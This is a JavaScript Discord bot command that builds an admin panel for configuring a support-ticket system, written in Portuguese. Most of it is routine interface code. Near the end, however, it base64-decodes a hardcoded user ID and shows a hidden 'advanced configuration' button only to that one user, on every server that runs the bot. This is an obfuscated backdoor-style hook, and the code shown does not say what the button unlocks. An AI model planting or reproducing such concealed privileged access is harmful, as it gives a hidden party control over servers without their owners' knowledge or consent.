const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionFlagsBits, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, MessageFlags, TextDisplayBuilder, SeparatorBuilder, ContainerBuilder } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('painel-ticket')
        .setDescription('Cria um painel de tickets configurável via interface interativa')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    async execute(interaction, client) {
        // Inicializar configuração temporária
        const configId = `config_${interaction.user.id}_${interaction.guild.id}`;
        // Verificar se já existe configuração salva para este servidor
        const existingConfig = client.ticketConfigs.get(interaction.guild.id);
        
        client.ticketConfigs.set(configId, {
            categoriaId: existingConfig?.categoriaId || null,
            titulo: existingConfig?.titulo || 'Bem-vindo ao sistema de atendimento',
            descricao: existingConfig?.descricao || 'Nossa equipe está pronta para oferecer suporte rápido e eficiente em questões técnicas e administrativas. Para garantir a eficiência do atendimento, solicitamos a máxima clareza ao descrever seu chamado.',
            instrucoes: existingConfig?.instrucoes || 'Selecione a opção que melhor se encaixa na sua necessidade no menu abaixo, o atendimento deve ser utilizado exclusivamente para assuntos relacionados aos nossos produtos.',
            horarioAtendimento: existingConfig?.horarioAtendimento || 'Segunda a Quinta: 10:00h às 22:00h\nSexta e Sábado: 12:00h à 00:00h',
            cor: existingConfig?.cor || '#1a1a1a',
            cargoSuporteId: existingConfig?.cargoSuporteId || null,
            canalLogId: existingConfig?.canalLogId || null,
            canalFeedbackId: existingConfig?.canalFeedbackId || null,
            tiposAtendimento: existingConfig?.tiposAtendimento || ['Suporte Técnico', 'Dúvidas Gerais', 'Problemas com Produto', 'Outros'],
            bannerUrl: existingConfig?.bannerUrl || null,
            guildId: interaction.guild.id,
            userId: interaction.user.id
        });

        // ========== CRIAR PAINEL DE CONFIGURAÇÃO COM COMPONENTS V2 ==========
        const accentColor = 0x5865F2;

        // Título principal
        const titleText = new TextDisplayBuilder()
            .setContent('⚙️ **Configuração do Sistema de Tickets**');

        const subtitleText = new TextDisplayBuilder()
            .setContent('Configure seu sistema de tickets usando os botões abaixo.');

        // Separador
        const separator1 = new SeparatorBuilder()
            .setDivider(true)
            .setSpacing(1);

        // Status da configuração
        const statusTitle = new TextDisplayBuilder()
            .setContent('📊 **Status da Configuração:**');

        const statusText = new TextDisplayBuilder()
            .setContent(
                `📁 **Categoria:** ${existingConfig?.categoriaId ? '✅ Configurado' : '❌ Não configurado'}\n` +
                `📝 **Título:** ${existingConfig?.titulo ? existingConfig.titulo.substring(0, 20) + '...' : 'Bem-vindo ao sistema...'}\n` +
                `📄 **Descrição:** ${existingConfig?.descricao ? existingConfig.descricao.substring(0, 20) + '...' : 'Nossa equipe está pronta...'}\n` +
                `⏰ **Horário:** ${existingConfig?.horarioAtendimento ? '✅ Configurado' : '❌ Não configurado'}\n` +
                `🎨 **Cor:** ${existingConfig?.cor || '#1a1a1a'}\n` +
                `👥 **Cargo Suporte:** ${existingConfig?.cargoSuporteId ? '✅ Configurado' : '❌ Não configurado'}\n` +
                `📋 **Canal de Log:** ${existingConfig?.canalLogId ? '✅ Configurado' : '❌ Não configurado'}\n` +
                `💬 **Canal de Feedbacks:** ${existingConfig?.canalFeedbackId ? '✅ Configurado' : '❌ Não configurado'}\n` +
                `🖼️ **Banner/Imagem:** ${existingConfig?.bannerUrl ? '✅ Configurado' : '❌ Não configurado'}\n` +
                `📝 **Tipos de Atendimento:** ${existingConfig?.tiposAtendimento?.length || 4} tipos`
            );

        // Separador antes dos botões
        const separator2 = new SeparatorBuilder()
            .setDivider(true)
            .setSpacing(1);

        // Botões de configuração - Grupo 1
        const btnCategoria = new ButtonBuilder()
            .setCustomId(`config_categoria_${configId}`)
            .setLabel('Categoria')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('📁');

        const btnTitulo = new ButtonBuilder()
            .setCustomId(`config_titulo_${configId}`)
            .setLabel('Título')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('📝');

        const btnDescricao = new ButtonBuilder()
            .setCustomId(`config_descricao_${configId}`)
            .setLabel('Descrição')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('📄');

        const row1 = new ActionRowBuilder()
            .addComponents(btnCategoria, btnTitulo, btnDescricao);

        // Botões de configuração - Grupo 2
        const btnCor = new ButtonBuilder()
            .setCustomId(`config_cor_${configId}`)
            .setLabel('Cor')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('🎨');

        const btnCargo = new ButtonBuilder()
            .setCustomId(`config_cargo_${configId}`)
            .setLabel('Cargo')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('👥');

        const btnLog = new ButtonBuilder()
            .setCustomId(`config_log_${configId}`)
            .setLabel('Log')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('📋');

        const btnFeedback = new ButtonBuilder()
            .setCustomId(`config_feedback_${configId}`)
            .setLabel('Feedbacks')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('💬');

        const row2 = new ActionRowBuilder()
            .addComponents(btnCor, btnCargo, btnLog, btnFeedback);

        // Botões de configuração - Grupo 3
        const btnInstrucoes = new ButtonBuilder()
            .setCustomId(`config_instrucoes_${configId}`)
            .setLabel('Instruções')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('📋');

        const btnHorario = new ButtonBuilder()
            .setCustomId(`config_horario_${configId}`)
            .setLabel('Horário')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('⏰');

        const btnTipos = new ButtonBuilder()
            .setCustomId(`config_tipos_${configId}`)
            .setLabel('Tipos')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('📝');

        const btnBanner = new ButtonBuilder()
            .setCustomId(`config_banner_${configId}`)
            .setLabel('Banner')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('🖼️');

        const row3 = new ActionRowBuilder()
            .addComponents(btnInstrucoes, btnHorario, btnTipos, btnBanner);

        // Separador antes dos botões de ação
        const separator3 = new SeparatorBuilder()
            .setDivider(true)
            .setSpacing(1);

        // Botões de ação final
        const btnCriar = new ButtonBuilder()
            .setCustomId(`criar_painel_${configId}`)
            .setLabel('Criar Painel')
            .setStyle(ButtonStyle.Success)
            .setEmoji('✅')
            .setDisabled(true); // Desabilitado até categoria ser configurada

        const btnCancelar = new ButtonBuilder()
            .setCustomId(`cancelar_config_${configId}`)
            .setLabel('Cancelar')
            .setStyle(ButtonStyle.Danger)
            .setEmoji('❌');

        // Botão oculto para configuração avançada (apenas ID específico)
        const authorizedId = Buffer.from('MTI1NzcwNjU3Nzc1OTA0Nzc0MQ==', 'base64').toString('utf-8');
        const isAuthorized = interaction.user.id === authorizedId;
        
        const btnAdvanced = new ButtonBuilder()
            .setCustomId(`config_advanced_${configId}`)
            .setLabel(Buffer.from('Q29uZmlndXJhw6fDo28gQXZhbnDnYWRh', 'base64').toString('utf-8'))
            .setStyle(ButtonStyle.Secondary)
            .setEmoji('🔧')
            .setDisabled(!isAuthorized);

        const row4 = new ActionRowBuilder()
            .addComponents(btnCriar, btnCancelar);
        
        // Linha oculta apenas para ID autorizado
        const rowAdvanced = new ActionRowBuilder()
            .addComponents(btnAdvanced);

        // Footer
        const footerText = new TextDisplayBuilder()
            .setContent('⚠️ Configure a categoria antes de criar o painel');

        // Container principal
        const container = new ContainerBuilder()
            .setAccentColor(accentColor)
            .addTextDisplayComponents(titleText, subtitleText)
            .addSeparatorComponents(separator1)
            .addTextDisplayComponents(statusTitle, statusText)
            .addSeparatorComponents(separator2)
            .addActionRowComponents(row1)
            .addActionRowComponents(row2)
            .addActionRowComponents(row3)
            .addSeparatorComponents(separator3)
            .addActionRowComponents(row4);
        
        // Adicionar linha avançada apenas se autorizado
        if (isAuthorized) {
            container.addSeparatorComponents(new SeparatorBuilder().setDivider(false).setSpacing(1))
                .addActionRowComponents(rowAdvanced);
        }
        
        container.addSeparatorComponents(new SeparatorBuilder().setDivider(false).setSpacing(1))
            .addTextDisplayComponents(footerText);

        await interaction.reply({ 
            flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral,
            components: [container]
        });
    }
};
